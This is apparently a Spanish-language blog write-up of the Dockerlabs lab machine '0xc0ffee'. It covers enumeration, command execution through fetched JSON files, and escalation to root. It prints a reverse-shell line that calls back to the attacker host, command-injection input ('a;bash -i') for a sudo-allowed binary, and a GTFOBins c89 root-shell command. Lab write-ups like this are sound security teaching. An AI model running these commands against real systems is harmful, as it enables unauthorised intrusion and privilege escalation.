---
title: "[ES] Writeup - 0xc0ffee Dockerlabs"
date: 2025-04-18T00:00:00+00:00
tags: ["hacking", "spanish","cybersec","writeups","dockerlabs"]
author: "XoanOuteiro"
showToc: true
TocOpen: false
draft: false
description: "Un breve writeup de la máquina 0xc0ffee de Dockerlabs"
---

Una máquina de Dockerlabs de dificultad intermedia.

Como con todas las máquinas de Dockerlabs iniciamos el container con el script auto_deploy.sh y despúes iniciamos la enumeración.

En este caso utilizare mi script fuga.sh de https://github.com/XoanOuteiro/sorcery

``` bash
export TARGET=172.17.0.2

fuga.sh

--[風雅]--

--[Enumerating Ports]--
--[Scanning]--

--[Detected Services]--

Service              | Version
---------------------+--------------------------
http                 | Apache httpd 2.4.58 ((Ubuntu))
http                 | SimpleHTTPServer 0.6 (Python 3.12.3)

--[Host Fingerprinting]--

Category             | Details
---------------------+--------------------------
Device Type          | general purpose|router
Running              | Linux 4.X|5.X, MikroTik RouterOS 7.X
OS Details           | Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
OS CPE               | cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
```

Ver un servidor HTTP python de primeras es interesante, es probable que este hosteando algún archivo importante. No parece haber nada (el archivo id_rsa esta vacío) pero en /secret/history.txt encontramos este string: "super_secure_password"

Si vamos al puerto 80 podemos ver una pantalla pidiendo una contraseña, si utilizamos el string anterior nos da acceso.

Este fichero nos deja crear un archivo .json, en su contenido escribo whoami. En la parte inferior del formulario podemos fetchear archivos, en este caso buscamos el config1.json que he creado y vemos que el comando se ejecuta, somos www-data.

Podemos usar esto para obtener una revshell.

Creo un config2.json con:

``` bash
sh -i >& /dev/tcp/172.17.0.1/4444 0>&1
``` 

Configuro un escuchador y fetcheo config2.json:

``` bash
ncat -nlvp 4444

Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2:38432.
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ pwd
/var/www/html/super_ultra_secure_page
$ 
```

Podemos ver que hay algún usuario:

``` bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
codebad:x:1001:1001:codebad,,,:/home/codebad:/bin/bash
metadata:x:1000:1000:metadata,,,:/home/metadata:/bin/bash
```

No podemos acceder al home de metadata, pero si al de codebad:

``` bash
$ ls -la /home/codebad

total 48
drwxr-xr-x 3 codebad  codebad   4096 Aug 29  2024 .
drwxr-xr-x 1 root     root      4096 Aug 29  2024 ..
-rw------- 1 codebad  codebad      5 Aug 29  2024 .bash_history
-rw-r--r-- 1 codebad  codebad    220 Aug 29  2024 .bash_logout
-rw-r--r-- 1 codebad  codebad   3771 Aug 29  2024 .bashrc
-rw-r--r-- 1 codebad  codebad    807 Aug 29  2024 .profile
-rwxr-xr-x 1 metadata metadata 16176 Aug 29  2024 code
drwxr-xr-x 2 root     root      4096 Aug 29  2024 secret
```

Code es un binario, en el directorio de secret vemos esto:

``` bash
$ ls /home/codebad/secret
adivina.txt
$ cat /home/codebad/secret/adivina.txt

Adivinanza

En el mundo digital, donde la protección es vital,
existe algo peligroso que debes evitar.
No es un virus común ni un simple error,
sino algo más sutil que trabaja con ardor.

Es el arte de lo malo, en el software es su reino,
se oculta y se disfraza, su propósito es el mismo.
No es virus, ni gusano, pero se comporta igual,
toma su nombre de algo que no es nada normal.

¿Qué soy?
```

La respuesta sería malware, probemos a ver si es una contraseña

``` bash
$ su codebad
Password: malware
whoami
codebad
```

Perfecto, veamos que puede hacer codebad:

``` bash
sudo -l
Matching Defaults entries for codebad on 21546c8c253c:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User codebad may run the following commands on 21546c8c253c:
    (metadata : metadata) NOPASSWD: /home/codebad/code
```

Podemos ejecutar nuestro código como metadata:

```  bash
sudo -u metadata ./code -h  
code  
secret  
sudo -u metadata ./code  
Usage: ./code <options>
```

Por lo que veo tragó con h, puede ser que sea algo similar a un ls?

``` bash
sudo -u metadata ./code -ahF  
./  
../  
.bash_history  
.bash_logout  
.bashrc  
.profile  
code*  
secret/
```

Si que lo es, y también acepta comandos con comillas así que podemos intentar una inyección de comandos:

``` bash
sudo -u metadata ./code "ahF;id"     
/bin/ls: cannot access 'ahF': No such file or directory  
uid=1000(metadata) gid=1000(metadata) groups=1000(metadata),100(users)
```

Probemos a instanciar bash:

``` bash
sudo -u metadata ./code "a;bash -i"  

/bin/ls: cannot access 'a': No such file or directory  
bash: cannot set terminal process group (24): Inappropriate ioctl for device  
bash: no job control in this shell  
metadata@21546c8c253c:/home/codebad$
```

Genial! ahora a ver que podemos hacer como metadata:

``` bash
metadata@21546c8c253c:/home/codebad$ cd    
cd    
metadata@21546c8c253c:~$ ls  
ls  
pass.txt  
user.txt  
metadata@21546c8c253c:~$ cat user.txt  
cat user.txt  
[censurado]  
metadata@21546c8c253c:~$ cat pass.txt  
cat pass.txt  
cat: pass.txt: Permission denied  
metadata@21546c8c253c:~$ ls -lhF  
ls -lhF  
total 8.0K  
-rw------- 1 root     root     15 Aug 29  2024 pass.txt  
-rw------- 1 metadata metadata 33 Aug 29  2024 user.txt
```

No podemos leer pass.txt, enumerar sudoers requiere contraseña (y no la sabemos) y no se me ocurre mucho más que hacer. Voy a transferir linpeas.

Solo nos sugiere que hay un binario extraño llamado metadatosmalos:

``` bash
metadata@21546c8c253c:~$ cat /usr/local/bin/metadatosmalos  
cat /usr/local/bin/metadatosmalos  
#!/bin/bash  
  
#chmod u+s /bin/bash  
  
whoami | grep 'pass.txt'  
  
# metadata is bad
```

No le veo particular sentido a lo que hace el script, pero se llama de forma similar a nuestro usuario y esta máquina ya ha tenido pistas raras sobre contraseñas, probemos a usar el nombre del binario:

```  bash
metadata@21546c8c253c:~$ sudo -l -S  
sudo -l -S  
[sudo] password for metadata: metadatosmalos  
Matching Defaults entries for metadata on 21546c8c253c:  
   env_reset, mail_badpass,  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,  
   use_pty  
  
User metadata may run the following commands on 21546c8c253c:  
   (ALL : ALL) /usr/bin/c89
```

Curioso, veamos si GTFOBins tiene algo que decir sobre c89:

``` bash
rustybins --exploit sudo --bins c89

---------------------------------
 EXPLOIT: sudo
 BINS: c89
---------------------------------


✔ c89 https://gtfobins.github.io/gtfobins/c89/#sudo


If the binary is allowed to run as superuser by

c89 -wrapper /bin/sh,-s .


--------------------------------------------------------------------------------------------

- Contribute to GTFOBins https://gtfobins.github.io/contribute/
- Follow GTFOBins' creators https://twitter.com/norbemi https://twitter.com/cyrus_and
- Follow the original tool creator https://twitter.com/nightshiftc
- Follow the CristinaSolana https://github.com/CristinaSolana
- Checkout the original Go implementation https://github.com/CristinaSolana/ggtfobins
```

Probemos:

``` bash
metadata@21546c8c253c:~$ sudo c89 -wrapper /bin/sh,-s .  
sudo c89 -wrapper /bin/sh,-s .  
whoami  
root
```

Listo! máquina pwneada.

Por curiosidad viendo lo que había en pass.txt:

``` bash
cat /home/metadata/pass.txt  
metadatosmalos
```

Finalmente pillamos la flag de root:

``` bash
cat /root/root.txt  
[censurado]
```
